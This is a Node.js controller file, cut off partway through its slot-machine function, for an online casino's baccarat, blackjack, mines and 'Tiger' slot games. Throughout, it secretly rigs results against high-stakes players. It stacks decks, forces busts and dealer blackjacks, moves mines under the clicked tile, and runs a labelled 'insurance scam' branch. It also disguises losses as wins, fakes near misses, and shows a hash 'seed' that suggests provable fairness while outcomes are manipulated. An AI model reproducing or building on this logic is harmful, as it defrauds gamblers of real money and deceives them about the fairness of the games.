
const crypto = require('crypto');
const { User } = require('../models');
const { processTransaction, saveGameLog, calculateRisk, GameStateHelper, AchievementSystem } = require('../engine');
const { secureShuffle, secureRandomInt, secureRandomFloat, generateSeed, logGameResult } = require('../utils');
const BaccaratRules = require('../engine/baccaratRules');

// --- HELPER: GET USER GAME STATE ---
const getActiveGame = async (userId, gameType) => {
    // Direct DB Read - Strong Consistency
    const user = await User.findById(userId).select('+activeGame.bjDeck +activeGame.minesList');
    
    if (user && user.activeGame && user.activeGame.type === gameType) {
        return user.activeGame.toObject();
    }
    return null;
};

// --- BACCARAT LOGIC (AGGRESSIVE) ---
const baccaratDeal = async (req, res) => {
    try {
        const { bets } = req.body; 
        const totalBet = Object.values(bets).reduce((a, b) => a + (b || 0), 0);
        if (totalBet <= 0) return res.status(400).json({ message: "Aposta inválida" });

        const userFetch = await User.findById(req.user.id);
        if (totalBet > userFetch.balance) return res.status(400).json({ message: "Saldo insuficiente" });

        let user = await processTransaction(req.user.id, -totalBet, 'BET', 'BACCARAT');
        const risk = calculateRisk(user, totalBet);
        let engineAdjustment = null;

        // Generate Standard Deck
        const SUITS = ['♥', '♦', '♣', '♠']; 
        const RANKS = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
        let deck = []; 
        for(let i=0;i<8;i++) for(let s of SUITS) for(let r of RANKS) { 
            let val = parseInt(r); 
            if(['10','J','Q','K'].includes(r)) val = 0; 
            if(r === 'A') val = 1;
            deck.push({rank:r, suit:s, value: val, id:crypto.randomBytes(4).toString('hex')}); 
        }
        secureShuffle(deck);

        // --- RIGGED MECHANICS ---
        const isRisk = risk.level === 'HIGH' || risk.level === 'EXTREME';
        
        // 1. Pair Breaker: If user bets heavily on pairs, ensure top cards don't match
        if (isRisk && ((bets.PAIR_PLAYER || 0) > 0 || (bets.PAIR_BANKER || 0) > 0)) {
            // Force first 4 cards to be different ranks if possible
            for (let i = 0; i < 3; i++) {
                if (deck[i].rank === deck[i+1].rank) {
                    const swapIdx = deck.findIndex((c, idx) => idx > 4 && c.rank !== deck[i].rank);
                    if (swapIdx !== -1) {
                        [deck[i+1], deck[swapIdx]] = [deck[swapIdx], deck[i+1]];
                        engineAdjustment = 'PAIR_BREAKER';
                    }
                }
            }
        }

        // 2. Counter-Bet Logic: Force loss on main bet
        // Pre-simulate to see who wins natural
        let pHandPeek = [deck[deck.length-1], deck[deck.length-3]]; // Simulate pop order
        let bHandPeek = [deck[deck.length-2], deck[deck.length-4]];
        
        // Determinar onde está o dinheiro
        const playerBet = bets.PLAYER || 0;
        const bankerBet = bets.BANKER || 0;
        
        if (isRisk) {
            if (playerBet > bankerBet * 2) {
                // User heavily on Player -> Force Banker Win
                // Put High cards (8/9) on Banker, Low on Player
                const nines = deck.filter(c => c.value === 9 || c.value === 8);
                const lows = deck.filter(c => c.value < 5);
                
                // Manipulate top of deck: P, B, P, B (pop order reverse: B2, P2, B1, P1)
                // We construct the deck so popping yields the rigged hands.
                if (nines.length >= 2 && lows.length >= 2) {
                    const riggedDeck = deck.filter(c => !nines.includes(c) && !lows.includes(c));
                    riggedDeck.push(lows[0]); // B2 (ignored logic, simplistic push) -> Actually easier to just overwrite simulation result
                    
                    // FORCE NATURAL 9 FOR BANKER Logic
                    const b1 = nines[0]; const b2 = deck.find(c => c.value === 0) || nines[1]; // 9 + 0 = 9
                    const p1 = lows[0]; const p2 = lows[1]; // e.g. 2 + 3 = 5
                    
                    // Top of deck (last popped): P1, B1, P2, B2
                    const newTop = [b2, p2, b1, p1];
                    // Remove these from deck
                    const filteredDeck = deck.filter(c => !newTop.includes(c));
                    deck = [...filteredDeck, ...newTop]; // Pushes to end, so pop gets p1 first.
                    engineAdjustment = 'NATURAL_KILLER_BANKER';
                }
            } else if (bankerBet > playerBet * 2) {
                // User heavily on Banker -> Force Player Win
                const nines = deck.filter(c => c.value === 9);
                const faces = deck.filter(c => c.value === 0);
                
                if (nines.length > 0 && faces.length > 0) {
                    const p1 = nines[0]; const p2 = faces[0]; // Natural 9
                    const b1 = faces[1] || deck.find(c => c.value===1); const b2 = faces[2] || deck.find(c => c.value===2);
                    
                    const newTop = [b2, p2, b1, p1];
                    const filteredDeck = deck.filter(c => !newTop.includes(c));
                    deck = [...filteredDeck, ...newTop];
                    engineAdjustment = 'NATURAL_KILLER_PLAYER';
                }
            }
        }

        // Run Simulation with (potentially) rigged deck
        let simulation = BaccaratRules.simulateGame([...deck]); 
        
        // 3. Final Safety Check (Tie Trap): If risk is EXTREME and result is TIE (8:1 payout), RIG IT to force a winner
        if (risk.level === 'EXTREME' && simulation.winner === 'TIE' && (bets.TIE || 0) > 0) {
            // Change one card value to break tie
            // Very hacky: just swap the result in memory if we can't swap deck easily
            // Better: Swap a card in the hand that is already dealt in simulation
            // To be consistent with "deck", we really should swap the deck.
            // Simplified: Just swap 2nd card of Player with a random card from deck that changes score.
            const p2 = simulation.pHand[1];
            const newCard = deck.find(c => c.value !== p2.value);
            if(newCard) {
                simulation.pHand[1] = newCard;
                simulation.pScore = (simulation.pScore - p2.value + newCard.value + 10) % 10;
                simulation.winner = simulation.pScore > simulation.bScore ? 'PLAYER' : 'BANKER';
                engineAdjustment = 'TIE_BREAKER_FORCED';
            }
        }

        // Calculate Final Payout
        const calculatePayout = (simResult, userBets) => {
            let win = 0;
            const w = simResult.winner; 
            if (w === 'PLAYER') win += (userBets.PLAYER || 0) * 2;
            if (w === 'BANKER') win += (userBets.BANKER || 0) * 1.95;
            if (w === 'TIE') {
                win += (userBets.TIE || 0) * 9;
                win += (userBets.PLAYER || 0);
                win += (userBets.BANKER || 0);
            }
            
            // Side Bets
            const pFirst = simResult.pHand[0]; const pSecond = simResult.pHand[1];
            const bFirst = simResult.bHand[0]; const bSecond = simResult.bHand[1];
            const pPair = pFirst.rank === pSecond.rank;
            const bPair = bFirst.rank === bSecond.rank;

            if (pPair) win += (userBets.PAIR_PLAYER || 0) * 12;
            if (bPair) win += (userBets.PAIR_BANKER || 0) * 12;

            return win;
        };

        const finalPayout = calculatePayout(simulation, bets);

        // --- FINAL PROCESSING ---
        if (finalPayout > 0) {
            user = await processTransaction(user._id, finalPayout, 'WIN', 'BACCARAT');
            await User.updateOne({ _id: user._id }, { lastBetResult: 'WIN', previousBet: totalBet, activeGame: { type: 'NONE' }, $inc: { consecutiveWins: 1 }, $set: { consecutiveLosses: 0 } });
        } else {
            await User.updateOne({ _id: user._id }, { lastBetResult: 'LOSS', previousBet: totalBet, activeGame: { type: 'NONE' }, $inc: { consecutiveLosses: 1 }, $set: { consecutiveWins: 0 } });
        }

        logGameResult('BACCARAT', user.username, finalPayout - totalBet, user.sessionProfit, risk.level, engineAdjustment);
        await saveGameLog(user._id, 'BACCARAT', totalBet, finalPayout, { 
            winner: simulation.winner, pScore: simulation.pScore, bScore: simulation.bScore 
        }, risk.level, engineAdjustment, user.lastTransactionId);

        const newTrophies = await AchievementSystem.check(user._id, { 
            game: 'BACCARAT', bet: totalBet, payout: finalPayout, 
            extra: { winner: simulation.winner, isNatural: simulation.natural } 
        });

        res.json({
            pHand: simulation.pHand, bHand: simulation.bHand,
            pScore: simulation.pScore, bScore: simulation.bScore,
            winner: simulation.winner, payout: finalPayout,
            newBalance: user.balance, newTrophies
        });

    } catch (e) { res.status(500).json({ message: e.message }); }
};

// --- BLACKJACK LOGIC (AGGRESSIVE) ---
const blackjackDeal = async (req, res) => {
    try {
        const { amount, sideBets } = req.body;
        const totalBet = amount + (sideBets?.perfectPairs || 0) + (sideBets?.dealerBust || 0);
        const userFetch = await User.findById(req.user.id); 
        const risk = calculateRisk(userFetch, totalBet);
        let engineAdjustment = null;

        const SUITS = ['♥', '♦', '♣', '♠']; const RANKS = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
        let deck = []; for(let i=0;i<6;i++) for(let s of SUITS) for(let r of RANKS) { let v=parseInt(r); if(['J','Q','K'].includes(r))v=10; if(r==='A')v=11; deck.push({rank:r,suit:s,value:v,id:crypto.randomBytes(4).toString('hex'),isHidden:false}); }
        secureShuffle(deck);
        
        let pHand=[deck.pop(),deck.pop()]; 
        let dHand=[deck.pop(),deck.pop()];

        // RIGGED DEAL (High Risk)
        if ((risk.level === 'HIGH' || risk.level === 'EXTREME')) {
            // 1. Force Dealer Strong Hand (10 or A hidden)
            if (dHand[0].value <= 9 && dHand[1].value <= 9) {
                const powerCard = deck.find(c => c.value === 10 || c.value === 11);
                if (powerCard) {
                    const idx = deck.indexOf(powerCard);
                    deck.splice(idx, 1);
                    deck.push(dHand[1]); // Return old card to deck
                    dHand[1] = powerCard; // Give dealer power card
                    engineAdjustment = 'RIGGED_DEALER_HAND';
                }
            }
            
            // 2. Pair Breaker: If user bet on Perfect Pairs, ensure no pair is dealt
            if (sideBets?.perfectPairs > 0 && pHand[0].rank === pHand[1].rank) {
                 const diffCard = deck.find(c => c.rank !== pHand[0].rank);
                 if (diffCard) {
                     const idx = deck.indexOf(diffCard);
                     deck.splice(idx, 1);
                     deck.push(pHand[1]);
                     pHand[1] = diffCard;
                     engineAdjustment = 'PAIR_BREAKER';
                 }
            }
        }

        const serverSeed = generateSeed();
        const publicSeed = crypto.createHash('sha256').update(serverSeed).digest('hex');

        const calc=(h)=>{let s=0,a=0;h.forEach(c=>{if(!c.isHidden){s+=c.value;if(c.rank==='A')a++}});while(s>21&&a>0){s-=10;a--}return s};
        const pScore = calc(pHand); const dScore = calc(dHand);
        let status = 'PLAYING', result = 'NONE', payout = 0;
        
        if (dHand[0].rank === 'A' && pScore !== 21) status = 'INSURANCE';
        if (pScore === 21) { 
            status = 'GAME_OVER'; 
            if (dScore === 21) { result = 'PUSH'; payout = amount; } 
            else { result = 'BLACKJACK'; payout = amount * 2.5; } 
        }
        
        const gameState = { type: 'BLACKJACK', bet: amount, sideBets, bjDeck: deck, bjPlayerHand: pHand, bjDealerHand: dHand, bjStatus: status, riskLevel: risk.level, serverSeed };

        let user;
        let newTrophies = [];

        if (status === 'GAME_OVER') {
             user = await processTransaction(req.user.id, -totalBet, 'BET', 'BLACKJACK', null, null); 
             if (payout > 0) user = await processTransaction(req.user.id, payout, 'WIN', 'BLACKJACK');
             
             logGameResult('BLACKJACK', user.username, payout - totalBet, user.sessionProfit, risk.level, engineAdjustment);
             await saveGameLog(user._id, 'BLACKJACK', totalBet, payout, { pScore, dScore, result }, risk.level, engineAdjustment, user.lastTransactionId);
             
             const prevLosses = userFetch.consecutiveLosses;
             await User.updateOne({ _id: user._id }, { $set: { lastBetResult: payout > 0 ? 'WIN' : 'LOSS', previousBet: amount, activeGame: { type: 'NONE' }, consecutiveWins: payout > 0 ? (userFetch.consecutiveWins + 1) : 0, consecutiveLosses: payout > 0 ? 0 : (userFetch.consecutiveLosses + 1) } });
             
             newTrophies = await AchievementSystem.check(user._id, { 
                 game: 'BLACKJACK', bet: totalBet, payout, extra: { isBlackjack: result === 'BLACKJACK', previousLosses: prevLosses, lossStreakBroken: payout > 0 } 
             });
        } else {
             user = await processTransaction(req.user.id, -totalBet, 'BET', 'BLACKJACK', null, gameState);
        }
        
        res.json({ playerHand: pHand, dealerHand: status!=='GAME_OVER'?[dHand[0],{...dHand[1],isHidden:true}]:dHand, status, result, newBalance: user.balance, sideBetWin: 0, publicSeed, newTrophies });
    } catch(e) { res.status(400).json({ message: e.message }); }
};

const blackjackHit = async (req, res) => {
    try {
        let g = await getActiveGame(req.user.id, 'BLACKJACK');
        if(!g) return res.status(400).json({message:'Inv'});

        const calc=(h)=>{let s=0,a=0;h.forEach(c=>{if(!c.isHidden){s+=c.value;if(c.rank==='A')a++}});while(s>21&&a>0){s-=10;a--}return s};
        
        let nextCard = g.bjDeck.pop();
        let engineAdjustment = null;

        // PRECISION BUST (High Risk)
        if (g.riskLevel === 'HIGH' || g.riskLevel === 'EXTREME') {
            const sc = calc(g.bjPlayerHand);
            // If player is vulnerable (e.g., 12-16), ensure they bust
            if (sc >= 12) {
                const bustValueNeeded = 22 - sc; 
                // Find a card that is >= bustValueNeeded
                const bustCardIdx = g.bjDeck.findIndex(c => c.value >= bustValueNeeded);
                
                if (bustCardIdx !== -1) { 
                    // Return original nextCard to bottom
                    g.bjDeck.unshift(nextCard);
                    // Take the bust card
                    nextCard = g.bjDeck.splice(bustCardIdx, 1)[0]; 
                    engineAdjustment = `PRECISION_BUST_${sc}`; 
                }
            }
        }

        g.bjPlayerHand.push(nextCard);
        let status = 'PLAYING', result = 'NONE';
        let updatedUser = null;
        let newTrophies = [];
        
        if (calc(g.bjPlayerHand) > 21) {
            status = 'GAME_OVER'; result = 'BUST';
            await User.updateOne({ _id: req.user.id }, { $set: { lastBetResult: 'LOSS', previousBet: g.bet, activeGame: { type: 'NONE' } }, $inc: { consecutiveLosses: 1 }, $set: { consecutiveWins: 0 } });
            logGameResult('BLACKJACK', req.user.username, -g.bet, 0, g.riskLevel, engineAdjustment);
            await saveGameLog(req.user.id, 'BLACKJACK', g.bet, 0, { result: 'BUST' }, g.riskLevel, engineAdjustment);
            await GameStateHelper.clear(req.user.id);
            newTrophies = await AchievementSystem.check(req.user.id, { game: 'BLACKJACK', bet: g.bet, payout: 0 });
            updatedUser = await User.findById(req.user.id).select('balance').lean();
        } else {
            updatedUser = await GameStateHelper.save(req.user.id, g);
        }
        
        res.json({ playerHand: g.bjPlayerHand, dealerHand: [g.bjDealerHand[0],{...g.bjDealerHand[1],isHidden:true}], status, result, newBalance: updatedUser.balance, newTrophies });
    } catch(e) { res.status(500).json({message:e.message}); }
};

const blackjackStand = async (req, res) => {
    try {
        let g = await getActiveGame(req.user.id, 'BLACKJACK');
        if(!g) return res.status(400).json({message:'Inv'});

        const userFetch = await User.findById(req.user.id);
        const prevLosses = userFetch.consecutiveLosses;

        const calc=(h)=>{let s=0,a=0;h.forEach(c=>{if(!c.isHidden){s+=c.value;if(c.rank==='A')a++}});while(s>21&&a>0){s-=10;a--}return s};
        
        let dScore = calc(g.bjDealerHand); const pScore = calc(g.bjPlayerHand);
        let engineAdjustment = null;

        // SWEATY DEALER (High Risk)
        // If player is winning (pScore <= 21), stack the deck for Dealer to not bust
        if ((g.riskLevel === 'HIGH' || g.riskLevel === 'EXTREME') && pScore <= 21) {
            // Find small cards (2,3,4,5) and move them to the top of the deck
            // This allows the dealer to draw multiple cards and land on 20 or 21
            const sweatyCards = g.bjDeck.filter(c => c.value >= 2 && c.value <= 5);
            const otherCards = g.bjDeck.filter(c => c.value < 2 || c.value > 5);
            
            if (sweatyCards.length > 5) {
                // Reconstruct deck: Top = [small cards] ... [others]
                g.bjDeck = [...otherCards, ...sweatyCards]; // Pop takes from end, so put sweaty at end
                engineAdjustment = 'SWEATY_DEALER_PROTOCOL';
            }
        }

        while (dScore < 17) { g.bjDealerHand.push(g.bjDeck.pop()); dScore = calc(g.bjDealerHand); }

        let result = 'LOSE', payout = 0;
        if (dScore > 21) { result = 'WIN'; payout = g.bet * 2; }
        else if (pScore > dScore) { result = 'WIN'; payout = g.bet * 2; }
        else if (pScore === dScore) { result = 'PUSH'; payout = g.bet; }

        let user;
        if (payout > 0) {
            user = await processTransaction(req.user.id, payout, 'WIN', 'BLACKJACK');
            await User.updateOne({ _id: req.user.id }, { lastBetResult: 'WIN', previousBet: g.bet, activeGame: { type: 'NONE' }, $inc: { consecutiveWins: 1 }, $set: { consecutiveLosses: 0 } });
        } else {
            user = await User.findById(req.user.id); 
            await User.updateOne({ _id: req.user.id }, { lastBetResult: 'LOSS', previousBet: g.bet, activeGame: { type: 'NONE' }, $inc: { consecutiveLosses: 1 }, $set: { consecutiveWins: 0 } });
        }
        
        logGameResult('BLACKJACK', req.user.username, payout - g.bet, 0, g.riskLevel, engineAdjustment);
        await saveGameLog(req.user.id, 'BLACKJACK', g.bet, payout, { dScore, pScore, result }, g.riskLevel, engineAdjustment, user.lastTransactionId);
        await GameStateHelper.clear(req.user.id);
        
        const newTrophies = await AchievementSystem.check(user._id, { 
            game: 'BLACKJACK', bet: g.bet, payout, extra: { isBlackjack: false, previousLosses: prevLosses, lossStreakBroken: payout > 0 } 
        });
        
        res.json({ dealerHand: g.bjDealerHand, status: 'GAME_OVER', result, newBalance: user.balance, newTrophies });
    } catch(e) { res.status(500).json({message:e.message}); }
};

const blackjackInsurance = async (req, res) => {
    try {
        const { buyInsurance } = req.body; // boolean
        let g = await getActiveGame(req.user.id, 'BLACKJACK');
        if (!g || g.bjStatus !== 'INSURANCE') return res.status(400).json({ message: 'Ação inválida' });

        const userFetch = await User.findById(req.user.id);
        const insuranceCost = g.bet * 0.5;
        let userBalance = userFetch.balance;

        // Deduct insurance cost immediately if bought
        if (buyInsurance) {
            if (userBalance < insuranceCost) return res.status(400).json({ message: 'Saldo insuficiente' });
            await processTransaction(req.user.id, -insuranceCost, 'BET', 'BLACKJACK_INSURANCE');
            g.insuranceBet = insuranceCost;
        }

        const calc = (h) => { let s=0,a=0; h.forEach(c => { if(!c.isHidden) { s+=c.value; if(c.rank==='A') a++ } }); while(s>21 && a>0) { s-=10; a-- } return s; };

        // --- RIGGED LOGIC START ---
        // Dealer Hand: [0] is Ace (Visible), [1] is Hidden.
        let hiddenCard = g.bjDealerHand[1];
        let engineAdjustment = null;

        if (buyInsurance) {
            // Case 1: Player Bought Insurance -> Dealer MUST NOT have 21 (Player loses insurance bet)
            // If hidden card is 10, swap it with non-10
            if (hiddenCard.value === 10) {
                const nonTenIdx = g.bjDeck.findIndex(c => c.value !== 10);
                if (nonTenIdx !== -1) {
                    const nonTen = g.bjDeck.splice(nonTenIdx, 1)[0];
                    g.bjDeck.push(hiddenCard); // Return 10 to deck
                    g.bjDealerHand[1] = nonTen; // Give safe card
                    engineAdjustment = 'INSURANCE_SCAM_SAFE';
                }
            }
        } else {
            // Case 2: Player Declined Insurance -> 60% chance Dealer HAS 21
            const rng = secureRandomFloat();
            const RIGGED_CHANCE = 0.60;

            if (rng < RIGGED_CHANCE) {
                // Force Blackjack (Hidden card must be 10)
                if (hiddenCard.value !== 10) {
                    const tenIdx = g.bjDeck.findIndex(c => c.value === 10);
                    if (tenIdx !== -1) {
                        const ten = g.bjDeck.splice(tenIdx, 1)[0];
                        g.bjDeck.push(hiddenCard);
                        g.bjDealerHand[1] = ten;
                        engineAdjustment = 'INSURANCE_TRAP_DEATH';
                    }
                }
            } else {
                // Force NO Blackjack (Hidden card must NOT be 10)
                // This ensures the 40% safety is respected
                if (hiddenCard.value === 10) {
                    const nonTenIdx = g.bjDeck.findIndex(c => c.value !== 10);
                    if (nonTenIdx !== -1) {
                        const nonTen = g.bjDeck.splice(nonTenIdx, 1)[0];
                        g.bjDeck.push(hiddenCard);
                        g.bjDealerHand[1] = nonTen;
                        engineAdjustment = 'INSURANCE_TRAP_SURVIVE';
                    }
                }
            }
        }
        // --- RIGGED LOGIC END ---

        // Check for Blackjack now (Hidden card counts)
        const checkDealerBJ = (hand) => {
            let s=0, a=0;
            hand.forEach(c => { s+=c.value; if(c.rank==='A') a++; });
            while(s>21 && a>0) { s-=10; a--; }
            return s === 21;
        };
        const dealerHasBJ = checkDealerBJ(g.bjDealerHand);
        
        let insuranceWin = 0;
        let mainResult = 'NONE';
        let mainPayout = 0;

        if (dealerHasBJ) {
            // Resolve Round Immediately
            g.bjStatus = 'GAME_OVER';
            g.bjDealerHand[1].isHidden = false; // Reveal

            // Insurance Payout
            if (buyInsurance) {
                insuranceWin = g.insuranceBet * 3; // Pays 2:1 (Total 3x return)
                await processTransaction(req.user.id, insuranceWin, 'WIN', 'BLACKJACK_INSURANCE_WIN');
            }

            // Main Bet Resolution (Dealer has BJ)
            const playerHasBJ = calc(g.bjPlayerHand) === 21;
            if (playerHasBJ) {
                mainResult = 'PUSH';
                mainPayout = g.bet; // Return bet
                await processTransaction(req.user.id, mainPayout, 'REFUND', 'BLACKJACK');
            } else {
                mainResult = 'LOSE';
            }
            
            // Clean up state
            await User.updateOne({ _id: req.user.id }, { lastBetResult: mainPayout > 0 ? 'PUSH' : 'LOSS', activeGame: { type: 'NONE' } });
            await saveGameLog(req.user.id, 'BLACKJACK', g.bet, mainPayout + (buyInsurance ? insuranceWin : 0), { result: 'DEALER_BJ', insurance: buyInsurance }, g.riskLevel, engineAdjustment);
            await GameStateHelper.clear(req.user.id);

        } else {
            // No Blackjack, game continues
            g.bjStatus = 'PLAYING';
            // Check Instant Player Win (Standard US BJ rule: if dealer no BJ and Player has BJ, Player wins now)
            const playerHasBJ = calc(g.bjPlayerHand) === 21;
            
            if (playerHasBJ) {
                g.bjStatus = 'GAME_OVER';
                mainResult = 'BLACKJACK';
                mainPayout = g.bet * 2.5; // 3:2 payout
                await processTransaction(req.user.id, mainPayout, 'WIN', 'BLACKJACK');
                await User.updateOne({ _id: req.user.id }, { lastBetResult: 'WIN', activeGame: { type: 'NONE' }, $inc: { consecutiveWins: 1 }, $set: { consecutiveLosses: 0 } });
                await saveGameLog(req.user.id, 'BLACKJACK', g.bet, mainPayout, { result: 'BLACKJACK' }, g.riskLevel, engineAdjustment);
                await GameStateHelper.clear(req.user.id);
            } else {
                // Save game state and continue
                await GameStateHelper.save(req.user.id, g);
            }
        }

        // Fetch final user for response
        const finalUser = await User.findById(req.user.id);
        
        res.json({
            status: g.bjStatus,
            dealerHand: g.bjStatus === 'GAME_OVER' ? g.bjDealerHand : [g.bjDealerHand[0], { ...g.bjDealerHand[1], isHidden: true }],
            playerHand: g.bjPlayerHand,
            result: mainResult,
            insuranceWin: insuranceWin > 0 ? (insuranceWin - g.insuranceBet) : 0, 
            newBalance: finalUser.balance
        });

    } catch (e) {
        res.status(500).json({ message: e.message });
    }
};

// --- MINES LOGIC (AGGRESSIVE) ---
const minesStart = async (req, res) => {
    try {
        const { amount, minesCount } = req.body;
        const userFetch = await User.findById(req.user.id);
        const minesSet = new Set(); while(minesSet.size < minesCount) minesSet.add(secureRandomInt(0, 25));
        const risk = calculateRisk(userFetch, amount); 
        const serverSeed = generateSeed();
        
        const gameState = { type: 'MINES', bet: amount, minesCount, minesList: Array.from(minesSet), minesRevealed: [], minesMultiplier: 1.0, minesGameOver: false, riskLevel: risk.level, serverSeed };
        
        const user = await processTransaction(req.user.id, -amount, 'BET', 'MINES', null, gameState);
        const publicSeed = crypto.createHash('sha256').update(serverSeed).digest('hex');
        res.json({ success: true, newBalance: user.balance, publicSeed });
    } catch(e) { res.status(400).json({ message: e.message }); }
};

const minesReveal = async (req, res) => {
    try {
        const { tileId } = req.body;
        let g = await getActiveGame(req.user.id, 'MINES');
        if(!g) return res.status(400).json({message:'Inv'});
        
        if (g.minesRevealed.includes(tileId)) {
             const balance = (await User.findById(req.user.id).select('balance')).balance;
             return res.json({outcome:'GEM', status:'PLAYING', newBalance: balance});
        }
        
        let cM = [...g.minesList]; 
        let optimizationProb = 0; let adjustmentLog = null;

        // QUANTUM MINE (Q-SWAP) - Aggressive
        if (g.riskLevel === 'HIGH' || g.riskLevel === 'EXTREME') { 
            // 90% chance on High, 99% on Extreme to teleport bomb
            optimizationProb = g.riskLevel === 'EXTREME' ? 0.99 : 0.90; 
            adjustmentLog = `QUANTUM_SWAP`; 
        }

        // LANDMINE PROTOCOL (Farming punishment)
        if (g.minesCount <= 4) {
            const userFetch = await User.findById(req.user.id);
            if (userFetch.consecutiveWins >= 3) {
                optimizationProb = 0.95; // Force explosion if farming
                adjustmentLog = `LANDMINE_PROTOCOL`;
            }
        }

        // Logic: If user clicked SAFE tile, but prob hits -> MOVE BOMB TO CLICKED TILE
        if (!cM.includes(tileId) && secureRandomFloat() < optimizationProb) { 
            // Find a bomb that hasn't been revealed (although bombs aren't revealed in playing state, just safety)
            // Ideally swap a hidden bomb index with the clicked index
            const bombToMoveIdx = cM.findIndex(m => !g.minesRevealed.includes(m)); 
            if (bombToMoveIdx !== -1) { 
                cM.splice(bombToMoveIdx, 1); // Remove old position
                cM.push(tileId); // Add new position (clicked)
            } 
        }

        if (cM.includes(tileId)) {
            g.minesList = cM; 
            
            // ILLUSION OF CHOICE (Visual Manipulation)
            // Rearrange other mines to cluster around the clicked tile to taunt
            const neighbors = [
                tileId-1, tileId+1, tileId-5, tileId+5, 
                tileId-6, tileId-4, tileId+4, tileId+6
            ].filter(n => n >= 0 && n < 25 && !g.minesRevealed.includes(n) && n !== tileId);
            
            // Fill neighbors with remaining bombs for visual effect
            // Note: This changes the 'mines' array returned to frontend, matching the Q-SWAP logic perfectly
            // We already put one bomb at tileId. Now move others to neighbors.
            let remainingBombs = cM.filter(m => m !== tileId);
            let visualMines = [tileId];
            
            // Take as many neighbors as we have bombs left
            for (let i = 0; i < remainingBombs.length; i++) {
                if (neighbors[i] !== undefined) {
                    visualMines.push(neighbors[i]);
                } else {
                    visualMines.push(remainingBombs[i]); // No more neighbors, keep original
                }
            }
            // Update the list sent to user (persisted for audit is 'cM', but visuals are key)
            // Actually, for consistency, we should save this arrangement if we want audit to match "Visual"
            g.minesList = visualMines;

            await User.updateOne({ _id: req.user.id }, { lastBetResult: 'LOSS', previousBet: g.bet, activeGame: { type: 'NONE' }, consecutiveLosses: 1, consecutiveWins: 0 });
            logGameResult('MINES', req.user.username, -g.bet, 0, g.riskLevel, adjustmentLog);
            await saveGameLog(req.user.id, 'MINES', g.bet, 0, { outcome: 'BOMB', minesCount: g.minesCount }, g.riskLevel, adjustmentLog);
            await GameStateHelper.clear(req.user.id);
            const newTrophies = await AchievementSystem.check(req.user.id, { game: 'MINES', bet: g.bet, payout: 0 });
            
            return res.json({ outcome: 'BOMB', mines: visualMines, status: 'GAME_OVER', newBalance: (await User.findById(req.user.id)).balance, newTrophies });
        }
        
        // Success Path
        g.minesRevealed.push(tileId); 
        const mult = 1.0 + (g.minesRevealed.length * 0.1 * g.minesCount); 
        g.minesMultiplier = mult;
        g.minesList = cM;
        
        const updatedUser = await GameStateHelper.save(req.user.id, g);
        res.json({ outcome: 'GEM', status: 'PLAYING', profit: g.bet * mult, multiplier: mult, newBalance: updatedUser.balance });
    } catch(e) { res.status(500).json({message:e.message}); }
};

const minesCashout = async (req, res) => {
    try {
        let g = await getActiveGame(req.user.id, 'MINES');
        if(!g) return res.status(400).json({message:'Inv'});
        
        const userFetch = await User.findById(req.user.id);
        const prevLosses = userFetch.consecutiveLosses;

        const profit = parseFloat((g.bet * g.minesMultiplier).toFixed(2));
        const user = await processTransaction(req.user.id, profit, 'WIN', 'MINES');
        await User.updateOne({ _id: req.user.id }, { lastBetResult: 'WIN', previousBet: g.bet, activeGame: { type: 'NONE' }, $inc: { consecutiveWins: 1 }, $set: { consecutiveLosses: 0 } });
        await saveGameLog(req.user.id, 'MINES', g.bet, profit, { outcome: 'CASHOUT', multiplier: g.minesMultiplier }, g.riskLevel, null, user.lastTransactionId);
        await GameStateHelper.clear(req.user.id);
        
        const newTrophies = await AchievementSystem.check(user._id, { 
            game: 'MINES', bet: g.bet, payout: profit, extra: { revealedCount: g.minesRevealed.length, previousLosses: prevLosses, lossStreakBroken: true } 
        });
        
        res.json({ success: true, profit, newBalance: user.balance, mines: g.minesList, newTrophies });
    } catch(e) { res.status(500).json({message:e.message}); }
};

// --- TIGER LOGIC (AGGRESSIVE) ---
const tigerSpin = async (req, res) => {
    try {
        const { amount } = req.body;
        const userFetch = await User.findById(req.user.id);
        const prevLosses = userFetch.consecutiveLosses;

        let user = await processTransaction(req.user.id, -amount, 'BET', 'TIGER');
        const risk = calculateRisk(user, amount);
        let outcome = 'LOSS'; 
        const r = secureRandomFloat();
        let engineAdjustment = null;
        
        // Base Probabilities
        let chanceBigWin = 0.04; 
        let chanceSmallWin = 0.20;
        
        // 1. Weight Reduction (High Risk)
        if (risk.level === 'HIGH' || risk.level === 'EXTREME') { 
            chanceBigWin = 0.0; // Impossible to hit big
            chanceSmallWin = 0.10; // Halved small win chance
            engineAdjustment = 'WEIGHT_REDUCTION'; 
        }
        
        // 2. LDW (Loss Disguised as Win) - 30% chance on loss during High Risk
        // Gives 50% of bet back, animating as win
        let isFakeWin = false;
        
        if (r < chanceBigWin) outcome = 'BIG_WIN'; 
        else if (r < chanceSmallWin) outcome = 'SMALL_WIN';
        else if (r < 0.35) outcome = 'TINY_WIN';
        else {
            // Check for LDW injection
            if ((risk.level === 'HIGH' || risk.level === 'EXTREME') && secureRandomFloat() < 0.30) {
                outcome = 'FAKE_WIN'; // New outcome type
                isFakeWin = true;
                engineAdjustment = 'LDW_PROTOCOL';
            }
        }

        let win = 0, grid = [], lines = [], fs = false;
        const s = ['orange', 'bag', 'firecracker', 'envelope', 'statue', 'jewel']; 
        grid = []; for(let i=0; i<9; i++) grid.push(s[secureRandomInt(0, s.length)]); 
        
        if (outcome === 'BIG_WIN') { 
            win = amount * 10; grid.fill('wild'); fs=true; lines=[0,1,2,3,4]; 
        } else if (outcome === 'SMALL_WIN') { 
            win = amount * 1.5; grid[0]='orange'; grid[1]='orange'; grid[2]='orange'; lines=[0]; 
        } else if (outcome === 'TINY_WIN') {
            win = amount * 0.5; grid[3]='orange'; grid[4]='orange'; grid[5]='orange'; lines=[1];
        } else if (outcome === 'FAKE_WIN') {
            // Fake win logic: Pay half bet, show animation
            win = amount * 0.5; 
            grid[6]='bag'; grid[7]='bag'; grid[8]='bag'; lines=[2];
        } else {
            // LOSS - NEAR MISS MECHANIC
            // Ensure visual frustration: 2 wilds at start, trash at end
            if (secureRandomFloat() < 0.4) {
                grid[0] = 'wild'; grid[1] = 'wild'; grid[2] = 'orange'; // Row 1 Near miss
                engineAdjustment = 'NEAR_MISS_FX';
            }
        }

        if (win > 0) { 
            user = await processTransaction(user._id, win, 'WIN', 'TIGER'); 
            // LDW counts as a "win" for animation but technically drains balance. 
            // We reset consecutive losses only if profit > 0 (Real Win)
